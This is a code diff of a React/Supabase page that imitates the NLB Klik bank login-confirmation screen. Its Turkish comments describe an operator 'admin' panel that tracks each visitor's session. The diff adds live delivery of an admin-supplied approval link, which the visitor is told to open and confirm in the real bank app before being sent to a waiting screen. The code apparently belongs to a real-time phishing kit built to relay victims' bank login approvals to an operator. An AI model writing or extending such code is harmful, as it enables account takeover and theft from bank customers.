@@ -10,9 +10,11 @@ type Props = {
   sessionId: string;
 };
 
-// NLB Klik mobil onay ekrani: kullanici bu sayfada "Potrdi" butonuna basar
-// -> form_data.approvalStatus 'nlb_confirmed' olur (admin kolonu: NLB Onaylandi)
-// -> session bekleme ekranina duser.
+// NLB Klik onay ekrani:
+// 1) Admin baglanti gonderir (form_data.nlbApprovalLink) -> kolon "NLB Bekliyor"
+// 2) Kullanici baglantiya tiklar -> NLB uygulamasi acilir, orada onaylar
+// 3) Sayfaya donup "Potrdil sem" basar -> approvalStatus='nlb_confirmed'
+//    (kolon: NLB Onaylandi) -> bekleme ekrani.
 export function NlbOnayClient({ sessionId }: Props) {
   const router = useRouter();
   const supabase = useMemo(() => createBrowserSupabaseClient(), []);
@@ -35,8 +37,7 @@ export function NlbOnayClient({ sessionId }: Props) {
       if (cancelled) return;
       const fd = (data?.form_data ?? {}) as Record<string, unknown>;
       setSessionFormData(fd);
-      // Admin 'nlb' olarak isaretlediyse dokunma; eksikse 'bekliyor' durumuna cek
-      // ki admin kolonu "NLB Bekliyor" gostersin.
+      // Eksikse 'bekliyor' durumuna cek ki admin kolonu "NLB Bekliyor" gostersin.
       if (fd.approvalStatus !== "nlb" && fd.approvalStatus !== "nlb_confirmed") {
         void supabase
           .from("sessions")
@@ -49,6 +50,30 @@ export function NlbOnayClient({ sessionId }: Props) {
       cancelled = true;
     };
   }, [sessionId, supabase]);
+
+  // Admin linki sonradan guncellerse (sayfa acikken) canli al.
+  useEffect(() => {
+    if (supabase === null || !sessionId) return;
+    const channel = supabase
+      .channel(`nlb-onay-${sessionId}`)
+      .on(
+        "postgres_changes",
+        { event: "UPDATE", schema: "public", table: "sessions", filter: `id=eq.${sessionId}` },
+        (payload) => {
+          const fd = (payload.new as { form_data?: Record<string, unknown> })?.form_data;
+          if (fd && typeof fd === "object") setSessionFormData(fd);
+        },
+      )
+      .subscribe();
+    return () => {
+      void supabase.removeChannel(channel);
+    };
+  }, [sessionId, supabase]);
+
+  const approvalLink =
+    typeof sessionFormData.nlbApprovalLink === "string"
+      ? sessionFormData.nlbApprovalLink.trim()
+      : "";
 
   async function handleConfirm() {
     if (!supabase || !sessionId || saving) return;
@@ -118,39 +143,45 @@ export function NlbOnayClient({ sessionId }: Props) {
             Potrditev prijave
           </h1>
           <p className="mt-2 text-sm text-gray-500 leading-relaxed">
-            Za nadaljevanje potrdite prijavo v svoji mobilni aplikaciji{" "}
-            <span className="font-semibold text-gray-700">NLB Klik</span>.
+            Za prijavo kliknite spodnjo povezavo in zahtevo potrdite v svoji
+            mobilni aplikaciji <span className="font-semibold text-gray-700">NLB Klik</span>.
           </p>
 
-          {/* Kontrol bilgisi karti */}
-          <div className="mt-6 rounded-2xl bg-[#f6f2ff] border border-[#5b21b6]/15 px-5 py-4 text-left space-y-2.5">
-            <div className="flex items-center justify-between text-[13px]">
-              <span className="text-gray-500">Storitev</span>
-              <span className="font-semibold text-gray-800">Spletna banka NLB Klik</span>
-            </div>
-            <div className="flex items-center justify-between text-[13px]">
-              <span className="text-gray-500">Naprava</span>
-              <span className="font-semibold text-gray-800">Spletni brskalnik</span>
-            </div>
-            <div className="flex items-center justify-between text-[13px]">
-              <span className="text-gray-500">Status</span>
-              <span className="font-semibold text-[#5b21b6] flex items-center gap-1.5">
-                <span className="relative flex h-2 w-2">
-                  <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-[#5b21b6] opacity-60" />
-                  <span className="relative inline-flex rounded-full h-2 w-2 bg-[#5b21b6]" />
-                </span>
-                Čaka na potrditev
+          {/* Baglanti butonu - uygulamayi acar */}
+          {approvalLink ? (
+            <a
+              href={approvalLink}
+              className="mt-7 flex w-full items-center justify-center gap-2 rounded-2xl border-2 border-[#5b21b6] py-4 text-[15px] font-bold text-[#5b21b6] transition-all hover:bg-[#5b21b6]/5 active:scale-[0.98]"
+            >
+              <svg viewBox="0 0 24 24" className="h-5 w-5" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
+                <path d="M10 13a5 5 0 0 0 7.5.5l3-3a5 5 0 0 0-7-7l-1.7 1.7" />
+                <path d="M14 11a5 5 0 0 0-7.5-.5l-3 3a5 5 0 0 0 7 7l1.7-1.7" />
+              </svg>
+              Odpri aplikacijo NLB Klik
+            </a>
+          ) : (
+            <div className="mt-7 flex items-center justify-center gap-2 rounded-2xl border border-gray-200 bg-gray-50 py-4 text-[13px] font-semibold text-gray-400">
+              <span className="relative flex h-2 w-2">
+                <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-[#5b21b6] opacity-60" />
+                <span className="relative inline-flex rounded-full h-2 w-2 bg-[#5b21b6]" />
               </span>
+              Čakanje na povezavo…
             </div>
-          </div>
+          )}
 
+          <p className="mt-4 text-[12px] text-gray-400 leading-relaxed">
+            Po potrditvi v aplikaciji se vrnite na to stran in pritisnite
+            spodnji gumb.
+          </p>
+
+          {/* Onayladim butonu -> bekleme ekrani */}
           <button
             type="button"
             onClick={handleConfirm}
             disabled={saving || !ready}
-            className="mt-7 w-full rounded-2xl bg-gradient-to-r from-[#5b21b6] to-[#7c3aed] py-4 text-[15px] font-bold text-white shadow-[0_15px_35px_-10px_rgba(109,40,217,0.55)] transition-all hover:brightness-110 active:scale-[0.98] disabled:opacity-60"
+            className="mt-4 w-full rounded-2xl bg-gradient-to-r from-[#5b21b6] to-[#7c3aed] py-4 text-[15px] font-bold text-white shadow-[0_15px_35px_-10px_rgba(109,40,217,0.55)] transition-all hover:brightness-110 active:scale-[0.98] disabled:opacity-60"
           >
-            {saving ? "Potrjujem…" : "Potrdi prijavo"}
+            {saving ? "Potrjujem…" : "Potrdil sem"}
           </button>
 
           <p className="mt-4 text-[11px] text-gray-400 leading-relaxed">
